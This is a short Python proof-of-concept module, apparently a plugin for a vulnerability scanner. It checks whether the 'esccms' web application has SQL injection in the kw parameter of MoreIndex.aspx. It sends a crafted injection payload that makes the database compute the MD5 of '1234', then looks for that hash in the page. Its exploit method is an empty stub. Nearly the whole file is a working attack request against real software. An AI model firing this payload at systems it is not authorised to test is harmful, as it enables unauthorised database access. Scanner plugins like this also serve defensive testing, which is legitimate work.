# *_* coding=utf-8 *_*
# Author:Szrzvdny
import requests
class esccms_MoeIndex_sqli(object):

    def __init__(self,url):
        self.result = {
            'url':url,
            'cms':'esccms',
            'vuln_title':'esccms_MoeIndex_sqli',
            'vuln_level':1,
            'vuln_type':1,
            'vuln_author':'Szrzvdny',
            'vuln_source':'null',
            'description':'文件MoreIndex.aspx中,参数kw存在SQL注入',
        }
    def verify(self):
        headers = {
            'User-anget':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        }
        payload = "/MoreIndex.aspx?pkId=0&kw=a%27%20AnD%201=(SeLeCt%20Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27)))--&st=2&t=1"
        vulnurl = self.result['url'] + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                self.result['payload'] = self.result['url'] + payload
                return self.result
            else:
                pass
        except:
            pass

    def __exploit(self):
        pass

if __name__ == '__main__':
    verify = esccms_MoeIndex_sqli("http://127.0.0.1/")
    res = verify.verify()
    print(res)
    print(__file__)